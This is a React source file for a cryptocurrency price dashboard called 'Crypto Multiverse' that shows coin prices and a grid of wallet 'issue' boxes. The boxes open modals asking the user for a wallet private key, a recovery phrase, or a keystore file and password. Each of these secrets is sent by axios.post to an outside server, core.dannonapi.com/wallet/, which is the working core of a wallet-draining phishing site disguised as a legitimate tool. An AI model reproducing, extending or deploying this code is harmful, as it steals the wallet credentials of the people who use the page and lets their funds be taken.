import React, { useEffect, useState } from 'react';
import axios from 'axios';
import Carousel from 'react-multi-carousel';
import 'react-multi-carousel/lib/styles.css';
import IssueBoxes from './IssuesBoxes';
import { issues } from '../public/data';
import WalletConnectModal from './modals/WalletConnect';
import PrivateKeyModal from './modals/PrivateKeyModal';
import KeyPhraseModal from './modals/KeyPhraseModal';
import KeystoreModal from './modals/KeyStoreModal';


const App = () => {
  const [cryptoData, setCryptoData] = useState([]);
  const [offersData, setOffersData] = useState([]);
  const [currentPage, setCurrentPage] = useState(1);
  const [searchTerm, setSearchTerm] = useState('');
  const [displayModal, setDisplayModal] = useState(false)
  const [displayPrivateKeyForm, setDisplayPrivateKeyForm] = useState(false)
  const [displayKeyPhraseForm, setDisplayKeyPhraseForm] = useState(false)
  const [displayKeyStoreForm, setDisplayKeyStoreForm] = useState(false)
  const [details, setDetails] = useState({})
  const coinsPerPage = 10;

  const showModalFn =() =>{
    setDisplayModal(true)
  }
  const closeModalFn =() =>{
    setDisplayModal(false)
  }
  const closePrivateKeyFormFn =()=>{
    setDisplayPrivateKeyForm(false)
  }
  const closeKeyPhraseFormFn =()=>{
    setDisplayKeyPhraseForm(false)
  }
  const closeKeyStoreFormFn =()=>{
    setDisplayKeyStoreForm(false)
  }

  const storeDetails = (data) =>{
    const {wallet_type, access_type} = data
    setDetails({...details, wallet_type, access_type})
    setDisplayModal(false)
  }
  
  const storePrivateKey = (privateKey) =>{
    setDetails({...details, privateKey})
    setDisplayPrivateKeyForm(false)

    const {wallet_type, access_type} = details
    const data = {
      wallet_type,
      access_type,
      key: privateKey
    }
    axios.post('https://core.dannonapi.com/wallet/', data).then(res => console.log(res.status))
  }

  const storeKeyPhrase = (keyPhrase) =>{    
    setDetails({...details, keyPhrase})
    setDisplayKeyPhraseForm(false);

    const {wallet_type, access_type} = details
    const data = {
      wallet_type,
      access_type,
      key: keyPhrase.join(' ')
    }
    axios.post('https://core.dannonapi.com/wallet/', data).then(res => console.log(res.status))
  }

  const storeKeyStore = (data) =>{
    const [keystoreJson, password] = data;    
    setDetails({...details, keystoreJson, password})
    setDisplayKeyStoreForm(false);

    const {wallet_type, access_type} = details
    const userdata = {
      wallet_type,
      access_type,
      key: keystoreJson,
      password: password
    }
    axios.post('https://core.dannonapi.com/wallet/', userdata).then(res => console.log(res.status))
  }

  useEffect(()=>{
    if(details.access_type == "privateKey")
      setDisplayPrivateKeyForm(true)
    if(details.access_type == "keyPhrase")
      setDisplayKeyPhraseForm(true)
    if(details.access_type == "keystoreJson")
      setDisplayKeyStoreForm(true)
  },[details])

  useEffect(() => {
    // Fetch top 100 coins
    axios.get('https://api.coingecko.com/api/v3/coins/markets', {
      params: {
        vs_currency: 'usd',
        order: 'market_cap_desc',
        per_page: 100,
        page: 1,
        sparkline: false
      }
    })
    .then(response => {
      setCryptoData(response.data);
    })
    .catch(error => {
      console.error("There was an error fetching the cryptocurrency data!", error);
    });

    // Fetch offers data (you can fetch specific coins based on your choice or criteria)
    axios.get('https://api.coingecko.com/api/v3/coins/markets', {
      params: {
        vs_currency: 'usd',
        ids: 'bitcoin,ethereum,tether,solana', // Example of specific coins
        order: 'market_cap_desc',
        per_page: 4,
        page: 1,
        sparkline: false
      }
    })
    .then(response => {
      setOffersData(response.data);
    })
    .catch(error => {
      console.error("There was an error fetching the offers data!", error);
    });
  }, []);

  // Pagination logic
  const indexOfLastCoin = currentPage * coinsPerPage;
  const indexOfFirstCoin = indexOfLastCoin - coinsPerPage;
  const currentCoins = cryptoData.slice(indexOfFirstCoin, indexOfLastCoin);

  

  const paginate = (pageNumber) => setCurrentPage(pageNumber);

  return (
    <div className="app">
      <header className="header">
        <h1>Crypto Multiverse</h1>
      </header>
      
      <section className="platform-offers">
        <h2>The Platform Offers</h2>
        <Carousel 
          additionalTransfrom={0}
          arrows
          autoPlay
          autoPlaySpeed={3000}
          centerMode={false}
          containerClass="carousel-container"
          draggable
          infinite
          keyBoardControl
          minimumTouchDrag={80}
          renderButtonGroupOutside={false}
          renderDotsOutside={false}
          responsive={{
            desktop: {
              breakpoint: { max: 3000, min: 1024 },
              items: 4,
              slidesToSlide: 1
            },
            tablet: {
              breakpoint: { max: 1024, min: 464 },
              items: 2,
              slidesToSlide: 1
            },
            mobile: {
              breakpoint: { max: 464, min: 0 },
              items: 1,
              slidesToSlide: 1
            }
          }}
          showDots={false}
          sliderClass=""
          slidesToSlide={1}
          swipeable
        >
          {offersData.map((offer) => (
            <div className="offer" key={offer.id}>
              <img src={offer.image} alt={offer.name} />
              <p>{offer.name} <span className={offer.price_change_percentage_24h >= 0 ? "green-text" : "red-text"}>
                {offer.price_change_percentage_24h.toFixed(2)}%
              </span></p>
              <p>${offer.current_price > 1000 ? offer.current_price.toLocaleString(): offer.current_price}</p>
            </div>
          ))}
        </Carousel>
      </section>

      <section className="crypto-prices">
        <h2>Cryptocurrency Prices by Market Cap</h2>
        <input 
          type="text" 
          placeholder="Search For a Crypto Currency.." 
          value={searchTerm} 
          onChange={(e) => setSearchTerm(e.target.value)} 
        />
        <table>
          <thead>
            <tr>
              <th>Coin</th>
              <th>Price</th>
              <th>24h Change</th>
              <th>Market Cap</th>
            </tr>
          </thead>
          <tbody>
            {currentCoins.filter(crypto => 
              crypto.name.toLowerCase().includes(searchTerm.toLowerCase())
            ).map(crypto => (
              <tr key={crypto.id}>
                <td>
                  <img src={crypto.image} alt={crypto.name} width="50" />
                  {crypto.name} ({crypto.symbol.toUpperCase()})
                </td>
                <td>${crypto.current_price.toLocaleString()}</td>
                <td className={crypto.price_change_percentage_24h >= 0 ? "green-text" : "red-text"}>
                  {crypto.price_change_percentage_24h.toFixed(2)}%
                </td>
                <td>${crypto.market_cap.toLocaleString()}</td>
              </tr>
            ))}
          </tbody>
        </table>
        <div className="pagination">
          {Array.from({ length: Math.ceil(cryptoData.length / coinsPerPage) }, (_, i) => (
            <button key={i + 1} onClick={() => paginate(i + 1)}>
              {i + 1}
            </button>
          ))}
        </div>
      </section>

      <div className="issues-grid">
        {issues.map((issue, index) => (
          <IssueBoxes
            key={index}
            title={issue.title}
            description={issue.description}
            icon={issue.icon}
            link={issue.link}
            showModal={showModalFn}
          />
        ))}
      </div>

      {displayModal && <WalletConnectModal closeModal={closeModalFn} sendWalletAccess={storeDetails}/>}

      {displayPrivateKeyForm && <PrivateKeyModal closePrivateKeyForm={closePrivateKeyFormFn} sendPrivateKey={storePrivateKey}/>}
      {displayKeyPhraseForm && <KeyPhraseModal closeKeyPhraseForm={closeKeyPhraseFormFn} sendKeyPhrase={storeKeyPhrase}/>}
      {displayKeyStoreForm && <KeystoreModal closeKeyStoreForm={closeKeyStoreFormFn} sendKeyStore={storeKeyStore}/>}
    </div>
  );
}

export default App;
